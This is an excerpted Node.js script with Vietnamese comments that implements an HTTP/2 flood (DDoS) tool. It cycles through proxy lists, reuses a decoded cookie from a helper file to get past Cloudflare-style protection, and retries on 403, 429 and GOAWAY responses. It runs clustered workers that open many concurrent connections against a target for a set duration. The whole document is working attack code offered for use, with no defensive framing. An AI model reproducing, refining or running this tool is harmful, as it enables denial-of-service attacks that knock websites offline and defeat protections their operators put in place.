...
const encodedCookie = process.argv[8]; // Cookie đã encode từ p.js
...
try {
    if (encodedCookie && encodedCookie.length > 10) {
        ...
        // Debug log nếu cookie decode thành công
        if (process.argv.includes('--debug')) {
            console.log(`[BYPASS] Cookie decoded successfully, length: ${coki.length}`);
            console.log(`[BYPASS] Cookie preview: ${coki.substring(0, 100)}...`);
        }
    } else {
        // Nếu không phải base64, dùng trực tiếp
        coki = encodedCookie || '';
        if (process.argv.includes('--debug')) {
            console.log(`[BYPASS] Using raw cookie, length: ${coki.length}`);
        }
    }
} catch (e) {
    ...
    coki = encodedCookie || '';
    if (process.argv.includes('--debug')) {
        console.log(`[BYPASS] Cookie decode failed, using raw: ${e.message}`);
    }
}
...
if (!reqmethod || !target || !proxyfile) {
    ...
    console.log("\nCurrent arguments:");
    console.log(`Method: ${reqmethod || 'MISSING'}`);
    console.log(`Target: ${target || 'MISSING'}`);
    console.log(`Time: ${time || 'DEFAULT: 300s'}`);
    console.log(`Threads: ${threads || 'DEFAULT: 2'}`);
    console.log(`Rate: ${ratelimit || 'DEFAULT: 30/s'}`);
    console.log(`Proxy: ${proxyfile || 'MISSING'}`);
    console.log(`Cookie: ${encodedCookie ? 'PRESENT' : 'MISSING'}`);
    console.log(`UA: ${ua ? ua.substring(0, 50) + '...' : 'DEFAULT'}`);
...
// Debug log arguments
if (debugMode) {
    console.log(`[BYPASS] Starting attack with parameters:`);
    console.log(`  Method: ${reqmethod}`);
    console.log(`  Target: ${target}`);
    console.log(`  Duration: ${time} seconds`);
    console.log(`  Threads: ${threads}`);
    console.log(`  Rate: ${ratelimit}/s`);
    console.log(`  Proxy: ${proxyfile}`);
    console.log(`  Cookie length: ${coki.length}`);
...
function handle429(proxyKey) {
    ...
    if (proxyStats[proxyKey].rateLimit === 0) {
        ...
        if (debugMode) console.log(`[BYPASS] ${proxyKey} 429 ${proxyStats[proxyKey].rateLimit}`);
    }
...
function go() {
    ...
    const netSocket = net.connect(Number(proxy[1]), proxy[0], () => {
        ...
        netSocket.once('data', (data) => {
            ...
            if (!response.includes('200')) {
                if (debugMode) console.log(`[BYPASS] Proxy connection failed: ${response.substring(0, 100)}`);
                netSocket.destroy();
                setTimeout(go, 1000);
                return;
            }

            if (debugMode) console.log(`[BYPASS] Proxy connected successfully to ${proxyfile}`);
            ...
            const tlsSocket = tls.connect({
                ...
                if (!tlsSocket.alpnProtocol || tlsSocket.alpnProtocol === 'http/1.1') {
                    if (forceHttp == 2) {
                        if (debugMode) console.log(`[BYPASS] HTTP/1.1 detected, closing connection`);
                        tlsSocket.end(() => tlsSocket.destroy());
                        return;
                    }

                    // HTTP/1.1 mode (nếu cần)
                    tlsSocket.end(() => tlsSocket.destroy());
                    return;
                }
                ...
                // HTTP/2 mode
                if (debugMode) console.log(`[BYPASS] HTTP/2 connection established with ALPN: ${tlsSocket.alpnProtocol}`);
                        ...
                        if (frame != null) {
                            ...
                            if (frame.type == 1) {
                                ...
                                if (status == "403" || status == "401") {
                                    if (debugMode) console.log(`[BYPASS] Access denied (${status}), reconnecting...`);
                                    tlsSocket.end(() => tlsSocket.destroy());
                                    ...
                                    if (retryAfter) {
                                        ...
                                        if (debugMode) console.log(`[BYPASS] Rate limited (429), retry after ${retryAfter}s | cf-cache-status: ${cachecontrol} | ${iii} ${cfray}`);
                                        setTimeout(() => {
                                            tlsSocket.end(() => tlsSocket.destroy());
                                            netSocket.end(() => netSocket.destroy());
                                            go();
                            ...
                            if (frame.type == 7 || frame.type == 5) {
                                if (frame.type == 7) {
                                    if (debugMode) {
                                        ...
                                        statuses["GOAWAY"]++;
                                        console.log(`[BYPASS] GOAWAY received, reconnecting...`);
                                    }
                ...
                function sendRequests() {
                    ...
                    // Sử dụng cookie từ p.js (đã decode)
                    const headers = [
                        [":method", bucuadi],
                        [":authority", url.hostname],
                        [":scheme", "https"],
                        [":path", query ? handleQuery(query) : url.pathname],
                        ["user-agent", ua], // Sử dụng UA từ p.js
                        ["cookie", coki],   // Sử dụng cookie đã decode
                    ...
                    if (batch.length > 0) {
                        tlsSocket.write(Buffer.concat(batch), (err) => {
                            if (err) {
                                if (debugMode) console.log(`[BYPASS] Write error: ${err.message}`);
                                tlsSocket.end(() => tlsSocket.destroy());
                                return;
                            }
                ...
                if (debugMode) console.log(`[BYPASS] TLS error: ${err.message}`);
                tlsSocket.destroy();
                setTimeout(go, 2000);
            });
        });
    ...
    netSocket.on('error', (err) => {
        if (debugMode) console.log(`[BYPASS] NetSocket error: ${err.message}`);
        netSocket.destroy();
        setTimeout(go, 2000);
    });

    netSocket.on('close', () => {
        if (debugMode) console.log(`[BYPASS] Connection closed, reconnecting...`);
        setTimeout(go, 2000);
    });
}
...
if (cluster.isMaster) {
    ...
    console.log(`Proxy: ${proxyfile}`);
    console.log(`Cookie: ${coki ? '✓ PRESENT' : '✗ MISSING'}`);
    ...
    cluster.on('exit', (worker, code, signal) => {
        if (debugMode) console.log(`[BYPASS] Worker ${worker.id} died, restarting...`);
    ...
    if (debugMode) {
        ...
        setInterval(() => {
            ...
            console.log(`${name} Time: ${workerId} Workers: ${activeWorkers}/${numCPUs} Status: ${statusCodes || 'No responses yet'} Reqs: ${realTotal} => ${target}`);
            count++;
        }, 1000);
    }
    ...
    setTimeout(() => {
        ...
        console.log(`Duration: ${time} seconds reached`);
    ...
    // Start connections với rate limit
    const interval = setInterval(() => {
        if (consssas < threads * 10) { // Giới hạn số connection đồng thời
            consssas++;
            go();
        }
    }, 100); // 10 connections/giây mỗi worker
